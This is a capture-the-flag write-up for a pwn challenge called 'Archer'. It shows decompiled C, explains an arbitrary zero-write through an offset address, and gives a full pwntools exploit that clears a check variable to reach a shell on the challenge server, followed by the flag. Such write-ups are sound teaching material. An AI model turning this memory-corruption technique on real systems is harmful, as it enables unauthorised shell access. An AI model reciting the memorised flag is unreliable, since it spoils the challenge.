# Archer

## Challenge

### Disassembly

```c
undefined8 main(void)
{
    int64_t iVar1;
    char *s1;

    sym.imp.puts("It\'s battle day archer! Have you got what it takes?");
    sym.imp.printf("Answer [yes/no]: ");
    sym.imp.fflush(_reloc.stdout);
    sym.imp.fgets(&s1, 5, _reloc.stdin);
    iVar1 = sym.imp.strstr(&s1, 0x40204e);
    if (iVar1 != 0) {
        sym.imp.puts("Battle isn\'t for everyone.");
        sym.imp.exit(0);
    }
    sym.imp.puts("Awesome! Make your shot.");
    sym.makeshot();
    sym.imp.puts("Hope you shot well! This will decide the battle.");
    if (_obj.code == 0x13371337) {
        sym.imp.exit(0);
    }
    sym.imp.puts("WE WON!");
    sym.imp.fflush(_reloc.stdout);
    sym.imp.system("/bin/sh");
    return 0;
}
```

```c
void sym.makeshot(void)
{
    int64_t var_8h;

    sym.imp.puts("Here\'s your arrow!");
    sym.imp.puts("Now, which soldier do you wish to shoot?");
    sym.imp.fflush(_reloc.stdout);
    sym.imp.__isoc99_scanf(0x402109, &var_8h);
    var_8h = var_8h + 0x500000;
    *(undefined8 *)var_8h = 0;
    sym.imp.puts("Shot!");
    return;
}
```

## Solution

The challenge allows us to clear a chosen memory address, however, the address is offset by +0x500000.

If the value at `obj.code` (0x404068) is equal to its initial value (0x13371337), the program exits.
Otherwise, the program spawns a shell.

We can send a negative value such that when the program applies the offset, it lands on our desired target.
This will overwrite the `obj.code` variable, preventing the program from exiting, then giving us a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 193.57.159.27 --port 49723 archer
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('archer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '193.57.159.27'
port = int(args.PORT or 49723)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendline("yes")
io.sendline(hex(0x00404068 - 0x500000))

io.interactive()
```

## Flag

`rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}`

